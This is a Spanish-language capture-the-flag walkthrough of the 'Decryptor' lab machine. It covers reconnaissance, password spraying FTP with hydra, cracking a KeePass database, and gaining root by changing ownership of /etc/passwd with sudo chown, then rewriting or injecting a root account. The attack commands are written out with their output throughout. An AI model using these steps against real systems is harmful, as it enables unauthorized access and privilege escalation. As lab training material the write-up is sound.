---
title: "Decryptor - TheHackerLabs"
date: 2025-04-21
draft: false
slug: "THL-writeup-decryptor"
excerpt: "Esta fue una máquina sencilla. Después de analizar los escaneos, pasamos a analizar la página web que encontramos en el puerto 80, siendo que en su código fuente, encontramos un comentario que resulta ser un código Brainfuck. Decodificando este código, descubrimos que es una contraseña, la cual separamos por partes y aplicamos Password Spraying en los servicios activos, para identificar si el usuario se encuentra en la contraseña, siendo que así lo encontramos y ganamos acceso al servicio FTP. Dentro del FTP, encontramos una base de datos de KeePass, que descargamos y crackeamos, resultando en el usuario y contraseña para entrar al servicio SSH. Dentro del SSH, vemos que nuestro usuario puede usar el binario chown como Root, lo que nos permite cambiarle los permisos al archivo /etc/passwd, con tal de que nuestro usuario pueda modificarlo y así escalar privilegios de varias maneras."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "FTP", "SSH", "Brainfuck Decoding", "Web Steganography", "FTP Enumeration", "Cracking Hash", "Cracking KeePass Database", "Abusing /etc/passwd File", "Abusing Sudoers Privileges", "Privesc - Abusing Sudoers Privileges", "Privesc - Abusing /etc/passwd File", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "nano"
  - "hydra"
  - "ftp"
  - "keepass2john"
  - "JohnTheRipper"
  - "ssh"
  - "sudo"
  - "chown"
  - "openssl"
  - "which"
  - "echo"
  - "su"
links:
  - "https://md5decrypt.net/en/Brainfuck-translator/"
  - "https://gtfobins.github.io/gtfobins/chown/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-decryptor/decryptor.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.10
PING 192.168.10.10 (192.168.10.10) 56(84) bytes of data.
64 bytes from 192.168.10.10: icmp_seq=1 ttl=64 time=1.42 ms
64 bytes from 192.168.10.10: icmp_seq=2 ttl=64 time=0.911 ms
64 bytes from 192.168.10.10: icmp_seq=3 ttl=64 time=0.885 ms
64 bytes from 192.168.10.10: icmp_seq=4 ttl=64 time=0.711 ms

--- 192.168.10.10 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3035ms
rtt min/avg/max/mdev = 0.711/0.981/1.418/0.263 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.10 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-21 12:15 CST
Initiating ARP Ping Scan at 12:15
Scanning 192.168.10.10 [1 port]
Completed ARP Ping Scan at 12:15, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:15
Scanning 192.168.10.10 [65535 ports]
Discovered open port 80/tcp on 192.168.10.10
Discovered open port 22/tcp on 192.168.10.10
Discovered open port 2121/tcp on 192.168.10.10
Completed SYN Stealth Scan at 12:16, 8.39s elapsed (65535 total ports)
Nmap scan report for 192.168.10.10
Host is up, received arp-response (0.00089s latency).
Scanned at 2025-04-21 12:15:52 CST for 9s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE     REASON
22/tcp   open  ssh         syn-ack ttl 64
80/tcp   open  http        syn-ack ttl 64
2121/tcp open  ccproxy-ftp syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 3 puertos abiertos, pero me llama la atención que tenga el **servicio FTP** activo en el **puerto 2121**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,2121 192.168.10.10 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-21 12:16 CST
Nmap scan report for 192.168.10.10
Host is up (0.00089s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 01:86:f3:c5:03:b3:27:0e:47:8e:e9:2e:41:3f:b8:40 (ECDSA)
|_  256 5b:0c:8c:d1:16:99:16:90:59:c7:03:fe:21:67:1b:10 (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))

|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
2121/tcp open  ftp     vsftpd 3.0.3
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.31 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Bien, de momento lo único que podemos analizar es la página web del **puerto 80**, ya que, el escaneo no reporta que podamos utilizar al **usuario anonymous** para entrar al **servicio FTP**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-decryptor/Captura1.png">
</p>

Como lo dice el escaneo, es solo la página por defecto de **Apache2**.

Pero, si revisamos el código fuente, encontraremos algo interesante:

<p align="center">
<img src="/assets/images/THL-writeup-decryptor/Captura2.png">
</p>

Encontramos **código Brainfuck**, por lo que podemos tratar de decodificarlo con la siguiente página:
* <a href="https://md5decrypt.net/en/Brainfuck-translator/" target="_blank">Brainfuck Translator</a>

La página nos da este resultado:

<p align="center">
<img src="/assets/images/THL-writeup-decryptor/Captura3.png">
</p>

Parece ser una contraseña, pero no tenemos usuarios.

Tenemos que buscarlo.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Password Spraying y Enumerando Servicio FTP {#pSpraying}

Analizando la contraseña, podemos separarla en 3 partes:
```bash
nano usuarios.txt
-----------------
mario
eats
lettuce
```
Bien, podemos utilizar la herramienta **hydra** para probar la contraseña encontrada en los usuarios que creamos, lo que se traduce en aplicar **Password Spraying**.

Pero esto no funciono con el **servicio SSH**, por lo que vamos a intentarlo con el **servicio FTP**.

Intentémoslo:
```bash
hydra -L usuarios.txt -p '******' ftp://192.168.10.10:2121
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-21 14:05:25
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:3/p:1), ~1 try per task
[DATA] attacking ftp://192.168.10.10:2121/
[2121][ftp] host: 192.168.10.10   login: mario   password: ******
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-21 14:05:29
```
Muy bien, el usuario correcto es **mario**.

Con esto podemos entrar al **servicio FTP**:
```bash
ftp 192.168.10.10 2121
Connected to 192.168.10.10.
220 (vsFTPd 3.0.3)
Name (192.168.10.10:berserkwings): mario
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Y si vemos el contenido del **FTP**, vemos solo un archivo, siendo una base de datos de **KeePass**:
```bash
ftp> ls
229 Entering Extended Passive Mode (|||59048|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1390 May 21  2024 user.kdbx
226 Directory send OK.
```

Entremos en **modo binary**, para evitar problemas en la descarga y descarguemos este archivo:
```bash
ftp> binary
200 Switching to Binary mode.
ftp> get user.kdbx
local: user.kdbx remote: user.kdbx
229 Entering Extended Passive Mode (|||56989|)
150 Opening BINARY mode data connection for user.kdbx (1390 bytes).
100% |*********************************|  1390      304.14 KiB/s    00:00 ETA
226 Transfer complete.
1390 bytes received in 00:00 (184.58 KiB/s)
ftp> exit
221 Goodbye.
```
Lo tenemos.

### Cracking de Archivo .kdbx de KeePass y Ganando Acceso a la Máquina Víctima {#KeePass}

Podemos intentar crackear esta base de datos, con tal de encontrar su contraseña y poder entrar a este con **KeePassXC**.

Usaremos la herramienta **keepass2john** para obtener el hash del archivo:
```bash
keepass2john user.kdbx > hash
.
cat hash
user:$keepass$*2*1*0*db07e93b....
```

Ahora, usaremos **JohnTheRipper** para crackear el hash:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 1 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
******       (user)     
1g 0:00:00:00 DONE (2025-04-21 12:22) 7.692g/s 422953p/s 422953c/s 422953C/s nando1..molly21
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Genial, lo tenemos.

Ya solo tenemos que cargar la base de datos al **KeePassXC** y usar la contraseña para entrar.

Si no tienes **KeePassXC** en tu **Kali**, puedes instalarlo de esta manera:
```bash
sudo apt install keepassxc
```

Veamos el contenido de la base de datos:

<p align="center">
<img src="/assets/images/THL-writeup-decryptor/Captura4.png">
</p>

Tenemos un usuario y contraseña.

Lo podemos usar con el **servicio SSH** para poder entrar a la máquina víctima:
```bash
ssh chiquero@192.168.10.10
chiquero@192.168.10.10's password: 
Linux Decryptor 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
Last login: Tue May 21 07:52:17 2024
chiquero@Decryptor:~$ whoami
chiquero
```

Y podemos encontrar la flag del usuario, si nos movemos al directorio `/home` y entramos al directorio del **usuario mario**:
```bash
chiquero@Decryptor:~$ ls ..
chiquero  mario
chiquero@Decryptor:~$ cd ../mario/
chiquero@Decryptor:/home/mario$ ls
ftp  user.txt
chiquero@Decryptor:/home/mario$ cat user.txt
...
```

## Post Explotación {#Post}

### Escalando Privilegios con Binario chown {#chown}

Veamos qué privilegios tiene este usuario:
```bash
chiquero@Decryptor:~$ sudo -l
Matching Defaults entries for chiquero on Decryptor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User chiquero may run the following commands on Decryptor:
    (ALL) NOPASSWD: /usr/bin/chown
```
Podemos usar el **binario chown** como **Root**.

Usando la **guía de GTFOBins**, encontramos una forma de escalar privilegios con este binario:
* <a href="https://gtfobins.github.io/gtfobins/chown/" target="_blank">GTFOBins: chown</a>

<p align="center">
<img src="/assets/images/THL-writeup-decryptor/Captura5.png">
</p>

De esta forma, podemos cambiar el dueño de cualquier archivo de la máquina que sea del **Root**, para que nuestro usuario lo pueda ver o usar.

Por ejemplo, probemos con el directorio `/root`:
```bash
chiquero@Decryptor:~$ ls /root
ls: cannot open directory '/root': Permission denied
chiquero@Decryptor:~$ LFILE=/root
chiquero@Decryptor:~$ sudo chown $(id -un):$(id -gn) $LFILE
chiquero@Decryptor:~$ ls -la /root
total 32
drwx------  4 chiquero chiquero 4096 Jun  7  2024 .
drwxr-xr-x 18 root     root     4096 May 21  2024 ..
lrwxrwxrwx  1 root     root        9 Jun  7  2024 .bash_history -> /dev/null
-rw-r--r--  1 root     root      571 Apr 10  2021 .bashrc
-rw-------  1 root     root       20 May 21  2024 .lesshst
drwxr-xr-x  3 root     root     4096 May 21  2024 .local
-rw-r--r--  1 root     root      161 Jul  9  2019 .profile
-rw-r--r--  1 root     root       30 Jun  7  2024 root.txt
drwx------  2 root     root     4096 May 21  2024 .ssh
```
Al principio, no podemos ver nada, y luego de aplicar el cambio de dueño, podemos entrar al directorio `/root`. Pero como tal, no podemos hacer nada más.

Tenemos varías opciones que podemos aplicar aquí.

#### Cambiando Contraseña del Root Desde el /etc/passwd {#Privesc}

La primera opción que podemos hacer, es cambiar la contraseña del **Root**, modificando el archivo `/etc/passwd`.

Primero, cambiemos el dueño de este archivo, para que nuestro usuario pueda modificarlo:
```bash
chiquero@Decryptor:~$ ls -la /etc/passwd
-rw-r--r-- 1 root root 1290 May 21  2024 /etc/passwd
chiquero@Decryptor:~$ LFILE=/etc/passwd
chiquero@Decryptor:~$ sudo chown $(id -un):$(id -gn) $LFILE
chiquero@Decryptor:~$ ls -la /etc/passwd
-rw-r--r-- 1 chiquero chiquero 1290 May 21  2024 /etc/passwd
```

Ahora, vamos a crear el hash de una contraseña random con **openssl**:
```bash
chiquero@Decryptor:~$ which openssl
/usr/bin/openssl
chiquero@Decryptor:~$ openssl passwd hack123
$1$XcEUPl6S$xZJcD3/GIQGf26XA9hK7O.
```

Abre el archivo `/etc/passwd` con **nano** y cambia la x (que es la contraseña del **Root**), por la contraseña hasheada que acabamos de crear con **openssl**:

<p align="center">
<img src="/assets/images/THL-writeup-decryptor/Captura6.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-decryptor/Captura7.png">
</p>

Guárdalo y ciérralo.

Autentícate como **Root** con la contraseña que usaste:
```bash
chiquero@Decryptor:~$ su
Password: 
root@Decryptor:/home/chiquero# whoami
root
```
Listo, ya somos **Root**.

#### Eliminando Contraseña del Usuario Root {#Privesc2}

Otra cosa que podemos hacer, es solamente eliminar la contraseña del **Root**. Lo que nos permitiría autenticarnos como **Root** sin tener que dar una contraseña.

Solo abre el `/etc/passwd` y elimina la x:

<p align="center">
<img src="/assets/images/THL-writeup-decryptor/Captura8.png">
</p>

Guárdalo y ciérralo.

Ya solamente autentícate como **Root**:
```bash
chiquero@Decryptor:~$ su
root@Decryptor:/home/chiquero# whoami
root
```
Listo, volvimos a ser **Root**.

#### Inyectando Usuario en /etc/passwd y Dandole Permisos de Root {#Privesc3}

Como tal, no podemos crear un usuario, ya que nuestro usuario actual no tiene los permisos necesarios.

Lo que sí podemos hacer, es inyectar un usuario dentro del `/etc/passwd`.

Crea una contraseña random con **openssl**:
```bash
chiquero@Decryptor:~$ openssl passwd hack123
$1$XcEUPl6S$xZJcD3/GIQGf26XA9hK7O.
```
Vamos a copiar la sintaxis del **usuario Root** descrito en el `/etc/passwd`, para crear un usuario random y poder inyectarlo.

Quedaría así:
```bash
chiquero@Decryptor:~$ echo 'berserk:$1$XcEUPl6S$xZJcD3/GIQGf26XA9hK7O.:0:0::/home/berserk:/bin/bash' >> /etc/passwd
```

Si revisamos el `/etc/passwd`, ahí debería estar nuestro usuario:

<p align="center">
<img src="/assets/images/THL-writeup-decryptor/Captura9.png">
</p>

Ya solo nos autenticamos como nuestro usuario:
```bash
chiquero@Decryptor:~$ su berserk
Password: 
root@Decryptor:/home/chiquero# whoami
root
```
Listo, volvimos a ser **Root**.

Ya solo buscamos la flag:
```bash
root@Decryptor:/home/chiquero# cd /root
root@Decryptor:/root# ls
root.txt
root@Decryptor:/root# cat root.txt
...
```
Y con esto, terminamos la máquina.
